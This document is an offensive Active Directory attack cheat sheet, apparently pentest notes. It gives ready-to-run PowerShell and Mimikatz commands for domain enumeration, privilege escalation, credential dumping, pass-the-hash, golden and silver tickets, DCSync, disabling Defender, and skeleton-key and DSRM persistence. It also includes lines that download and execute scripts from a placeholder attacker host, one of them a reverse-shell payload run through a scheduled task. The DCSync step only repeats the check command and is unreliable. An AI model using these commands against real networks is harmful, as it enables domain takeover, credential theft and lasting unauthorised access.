# Active Directory Cheat Sheet

## General Process
- Recon
- Domain Enum
- Local Privilege Escalation
- Local Account Stealing
- Monitor Potential Incomming Account
- Local Account Stealing
- Admin Recon
- Lateral Mouvement
- Remote Administration
- Domain Admin Privileges
- Cross Trust Attacks
- Persistance and Exfiltrate

### Users,Computer,Domain Admins, Enterprise Administrators, Shares
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- Enumerate Users
```Powershell
Get-NetUser
Get-NetUser | select -ExpandProperty samaccountname
```

- Enumerate Computers
```Powershell
Get-NetComputer
```

- Enumerate Domain Administrators
```Powershell
Get-NetGroup -GroupName "Domain Admins" -FullData
Get-NetGroupMember -GroupName "Domain Admins"
```

- Enumerate Enterprise Administrators
```Powershell
Get-NetGroupMember -GroupName "Enterprise Admins"
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain target.local
```

- Enumerate Interesting Shares
```Powershell
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
```

### OU, Computer in target OU, GPO, GPO on target OU
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- Enumerate Restricted Groups from GPO
```Powershell
Get-NetGPOGroup -Verbose
```

- Membership of the Group "RDPUsers”
```Powershell
Get-NetGroupMember -GroupName RDPUsers
```

- List all the computers in the target OU
```powershell
Get-NetOU targetcomputer | %{Get-NetComputer -ADSPath $_}
```

- List GPOs
```powershell
Get-NetGPO
```
- GPO applied on the target OU
```powershell
(Get-NetOU targetmachine -FullData).gplink[LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local;0]
Get-NetGPO -ADSpath 'LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local'
```

### ACL for a Users group, ACL for Domain Admins group, right/permissions for target user
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- Enumerate ACLs
```powershell
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
```

- Enumerate ACLs for all the GPOs
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

- Enumerate GPOs where target user or group have interesting permissions
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "target"}
```

- Check for modify rights/permissions for the target
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "target"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "targetgroup"}
```

### Domain, trust, external trust
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- All domains
```powershell
Get-NetForestDomain -Verbose
```
- Map the trusts
```powershell
Get-NetDomainTrust
```

- Map all the trusts of the domain.local forest
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

- List external trusts
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
```
if Bi-Directional trust we can extract information


### Basic Privilege escalation, check access with new account
Tool : PowerView / PowerUp / Find-PSRemotingLocalAdminAccess

- Basic Privilege escalation with PowerUp
```powershell
1. Service Enumeration
Get-ServiceUnquoted                 #   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           #   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               #   returns services the current user can modify
Get-ServiceDetail                   #   returns detailed information about a specified service

2. Service Abuse
Invoke-ServiceAbuse                 #   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 #   writes out a patched C # service binary that adds a local admin or executes a custom command
Install-ServiceBinary               #   replaces a service binary with one that adds a local admin or executes a custom command
Restore-ServiceBinary               #   restores a replaced service binary with the original executable

3. DLL Hijacking
Find-ProcessDLLHijack               #   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  #   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     #   writes out a hijackable DLL

4. Registry Checks
Get-RegistryAlwaysInstallElevated   #  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               #   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       #   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns

5. Miscellaneous Checks
Get-ModifiableScheduledTaskFile     #   find schtasks with modifiable target files
Get-UnattendedInstallFile           #   finds remaining unattended installation files
Get-Webconfig                       #   checks for any encrypted web.config strings
Get-ApplicationHost                 #   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                #   retrieves the plaintext passwords for any found McAfee`'s SiteList.xml files
Get-CachedGPPPassword               #   checks for passwords in cached Group Policy Preferences files

6. Other Helpers/Meta-Functions
Get-ModifiablePath                  #   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        #   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     #   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  #   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          #   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    #   write out a MSI installer that prompts for a user to be added

7. Check ALL
Invoke-AllChecks                    #   runs all current escalation checks and returns a report
```

- Local Administrative access hunting
```powershell
Find-LocalAdminAccess -Verbose
```

- Local Administrative access hunting
```powershell
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
# No Stateful
Enter-PSSession -ComputerName targetcomputer.target.domain.local
# Stateful
$sess = New-Pssession -ComputerName targetcomputer.target.domain.local
Enter-Pssession -session $sess
```

### Setup BloodHound and Ingestor (kali)
Tool : neo4j / Sharphound / powercat

- Bloodhound use neo4j database
```bash
# term1
neo4j console
# term2
bloodhound
```
- BloodHound ingestores to gather data and information
```powershell
Import-Module .\SharpHound.ps1
# Actual session
Invoke-BloodHound -CollectionMethod All -Verbose
# Actual session with more options
Invoke-Bloodhound -Verbose -Domain 'domain.local' -DomainController '172.16.0.1' -CollectionMethod all
# With Credential
Invoke-Bloodhound -Verbose -Domain 'domain.local' -DomainController 'DC01.domain.local' -LDAPUser 'targetuser' -LDAPPass 'targetpass' -CollectionMethod  all

# transfert your ZIP
```

### Account Hunting
Tool : PowerView

- User Hunting
```powershell
Invoke-UserHunter # take long time to check all the machines in the domain
Invoke-UserHunter -CheckAccess
```


### Invoke Module in Memory
Too : Powershell / Mimicatz

- Download and execute Mimikatz
```powershell
iex (iwr http://attacker/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

### Remote Administration
Tool : Powershell

- Remote commande
```powershell
Invoke-Command -ScriptBlock {whoami /priv;hostname} -ComputerName targetcomputer.domain.local

$sess = New-Pssession -ComputerName targetcomputer.domain.local
Invoke-Command -ScriptBlock {whoami /priv;hostname} -session $sess
```

- Disable AMSI (admin privilege)
```powershell
$sess = New-PSSession -ComputerName targetcomputer.domain.local
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

### Enumerate the Applocker Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Run Powershell with NTLM hash of domain user
Tool : Mimikatz

- Invoke Mimikatz to create a token from user
```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetaccount /domain:domain.local /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
```

### Remote Mimikatz
Tool : Mimikatz

- Invoke Mimikatz to create a token from user
```powershell
$sess = New-PSSession -ComputerName target.domain.local
Enter-PSSession $sess
# EP BYPASS + AMSI BYPASS
exit
# PUSH LOCAL SCRIPT TO SESSION
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
# DUMPING
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

### GOLDEN TICKET
Tool : Mimikatz

- Generate Golden ticket with KRBTGT Hash
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:target.local /sid:S-1-5-x-x-x-x /krbtgt:00000000000000000000000000000000:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

- Check access
```powershell
ls \\DC01\c$
gwmi -Class win32_computersystem -ComputerName DC01.target.local

```

### SILVER TICKET
Tool : Mimikatz - hash of machine account

- Generate Silver ticket with machine account Hash - Task abuse
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
```
:information_source: Execute a task to run the reverse shell script
```powershell
schtasks /create /S machine.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "taskname" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://attackerip/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S machine.domain.local /TN "taskname"
```

- Generate Silver ticket with machine account Hash - WMI abuse
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:RPCSS/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
```
:information_source: Check WMI
```powershell
Get-WmiObject -Class win32_operatingsystem -ComputerName machine.target.local
```

## Usefull Object Permission

| Rights | Permission |
|---|---|
| GenericAll  | Full rights to the object (add users to a group or reset user's password)  |
| GenericWrite  | Update object's attributes (i.e logon script)  |
| WriteOwner  | Change object owner to attacker controlled user take over the object  |
| WriteDACL  | Modify object's ACEs and give attacker full control right over the object  |
| AllExtendedRights  | Ability to add user to a group or reset password  |
| ForceChangePassword  | Ability to change user's password  |
| Self (Self-Membership)  | Ability to add yourself to a group |

## Check Replication Rights, Modifiy, Execute The DCSync Attack
```powershell
# CHECK
. .\PowerView.ps1
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "targetuser") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}

# ADD OBJECT ACL
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName targetuser -Rights DCSync -Verbose

# DCSYNC
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "targetuser") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```


## Domain Attack and Persistance

### Skeleton Key Attack
```powershell
$sess = New-PSSession DC01.domain.local
Enter-PSSession -Session $sess
# BYPASS AMSI AND EXIT
Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```
:information_source: Only available with DA privilege until DC in not restarted. Can log on to any machine as any user unless the DC is restarted (use mimikatz as password)
:no_entry: Only one time, dont forget to reboot the DC to restore.

### Directory Services Restore Mode
```powershell
$sess = New-PSSession DC01.domain.local
Enter-PSSession -Session $sess
# BYPASS AMSI AND EXIT
Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# ALLOW DSRM ADMINISTRATOR TO LOGIN
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# PASS THE HASH DSRM ADMINISTRATOR
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
```
:information_source: DSRM is a local administrator on DC















:construction_worker:
